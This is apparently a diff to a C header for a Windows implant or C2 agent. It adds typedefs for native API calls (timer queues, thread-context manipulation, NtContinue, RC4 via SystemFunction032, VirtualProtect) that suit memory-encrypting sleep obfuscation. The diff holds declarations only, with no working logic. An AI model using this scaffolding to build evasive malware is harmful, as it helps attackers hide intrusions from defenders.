@@ -12,6 +12,25 @@
 #define NTSUCCESS 0
 #define UNLEN 256
 
+
+
+typedef enum INT_EVENT_TYPE
+{
+	NotificationEvent,
+	SynchronizationEvent
+} INT_EVENT_TYPE;
+
+typedef VOID(NTAPI* RTL_WAITORTIMERCALLBACKFUNC) (
+	PVOID lpParameter,
+	BOOLEAN TimerOrWaitFired
+);
+
+typedef struct _DataBuffer {
+	DWORD BufferLength;
+	DWORD MaxBufferLength;
+	BYTE* Buffer;
+} DataBuffer, * pDataBuffer;
+
 //HTTP APIS
 //WINHTTP APIS
 typedef HINTERNET(WINAPI* t_WinHttpOpen)(
@@ -100,8 +119,10 @@ typedef NTSTATUS(NTAPI* t_RtlGetVersion)(
 typedef NTSTATUS(NTAPI* t_NtClose)(
 	HANDLE Handle
 	);
+
 #define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)
 #define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
+
 typedef NTSTATUS(NTAPI* t_NtOpenProcessToken)(
 	HANDLE ProcessHandle,
 	ACCESS_MASK DesiredAccess,
@@ -141,6 +162,83 @@ typedef NTSTATUS(NTAPI* t_RtlRandomEx)(
 
 typedef NTSTATUS(NTAPI* t_NtGetTickCount)(
 	);
+typedef NTSTATUS(NTAPI* t_RtlCreateTimerQueue)(
+	PHANDLE NewTimerQueue
+	);
+typedef NTSTATUS(NTAPI* t_NtCreateEvent) (
+	_Out_ PHANDLE EventHandle,
+	_In_ ACCESS_MASK DesiredAccess,
+	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
+	_In_ INT_EVENT_TYPE EventType,
+	_In_ BOOLEAN InitialState
+);
+
+typedef VOID(NTAPI* t_RtlCaptureContext)(
+	_Out_ PCONTEXT ContextRecord
+);
+
+typedef NTSTATUS(NTAPI* t_RtlCreateTimer) (
+	HANDLE                      TimerQueue,
+	HANDLE* NewTimer,
+	RTL_WAITORTIMERCALLBACKFUNC Callback,
+	PVOID                       Parameter,
+	DWORD                       DueTime,
+	DWORD                       Period,
+	ULONG                       Flags
+);
+
+typedef NTSTATUS(NTAPI* t_RtlRegisterWait) (
+	HANDLE* out,
+	HANDLE                      handle,
+	RTL_WAITORTIMERCALLBACKFUNC callback,
+	void*						context,
+	ULONG                       milliseconds,
+	ULONG                       flags
+	);
+
+typedef NTSTATUS(NTAPI* t_RtlDeleteTimerQueue) (
+	HANDLE TimerQueueHandle
+	);
+
+typedef NTSTATUS(NTAPI* t_RtlCopyMappedMemory)(
+	void* pDest,
+	const void* pSrc,
+	SIZE_T bytesToCopy
+	);
+typedef NTSTATUS(NTAPI* t_NtWaitForSingleObject) (
+	IN HANDLE               ObjectHandle,
+	IN BOOLEAN              Alertable,
+	IN PLARGE_INTEGER       TimeOut OPTIONAL
+	);
+typedef NTSTATUS(NTAPI* t_NtSignalAndWaitForSingleObject)(
+	IN HANDLE               ObjectToSignal,
+	IN HANDLE               WaitableObject,
+	IN BOOLEAN              Alertable,
+	IN PLARGE_INTEGER       Time OPTIONAL
+	);
+typedef NTSTATUS(NTAPI* t_NtContinue) (
+	PCONTEXT ThreadContext,
+	BOOLEAN  RaiseAlert
+	);
+typedef NTSTATUS(NTAPI* t_NtSetEvent)(
+	HANDLE EventHandle,
+	PLONG  PreviousState OPTIONAL
+	);
+
+typedef NTSTATUS(NTAPI* t_NtSetContextThread)(
+	HANDLE          ThreadHandle,
+	PCONTEXT        ThreadContext
+	);
+
+typedef NTSTATUS(NTAPI* t_NtDuplicateObject)(
+	HANDLE      SourceProcessHandle,
+	HANDLE      SourceHandle,
+	HANDLE      TargetProcessHandle,
+	PHANDLE     TargetHandle,
+	ACCESS_MASK DesiredAccess,
+	ULONG       Attributes,
+	ULONG       Options
+	);
 
 
 //IPhlpapi APIS
@@ -154,6 +252,10 @@ typedef DWORD(WINAPI* t_GetAdaptersInfo)(
 typedef BOOL(WINAPI* t_GetUserNameA)(
 	LPSTR   lpBuffer,
 	LPDWORD pcbBuffer
+	);
+typedef NTSTATUS(*t_SystemFunction032)(
+		  pDataBuffer data,
+	const pDataBuffer key
 	);
 
 
@@ -196,6 +298,18 @@ typedef FARPROC(WINAPI* t_GetProcAddress)(
 //USER32 APIS
 typedef int (WINAPI* t_GetSystemMetrics)(
 	int nIndex
+	);
+
+typedef BOOL(WINAPI* t_VirtualProtect)(
+	LPVOID lpAddress,
+	SIZE_T dwSize,
+	DWORD  flNewProtect,
+	PDWORD lpflOldProtect
+	);
+typedef DWORD(WINAPI* t_WaitForSingleObjectEx)(
+	HANDLE hHandle,
+	DWORD  dwMilliseconds,
+	BOOL   bAlertable
 	);
 
 /*--------------------------------------------------------------------
@@ -814,9 +928,6 @@ typedef struct _INT_TEB
 
 
 
-
-
-
 typedef struct _INT_INITIAL_TEB {
 	PVOID                StackBase;
 	PVOID                StackLimit;
@@ -824,11 +935,6 @@ typedef struct _INT_INITIAL_TEB {
 	PVOID                StackCommitMax;
 	PVOID                StackReserved;
 } _INT_INITIAL_TEB, * P_INT_INITIAL_TEB;
-
-typedef struct _DataBuffer {
-	BYTE* Buffer;
-	ULONG BufferLength;
-} DataBuffer, * pDataBuffer;
 
 
 #define NtProcessHeap(agent) agent->pTeb->ProcessEnvironmentBlock->ProcessHeap
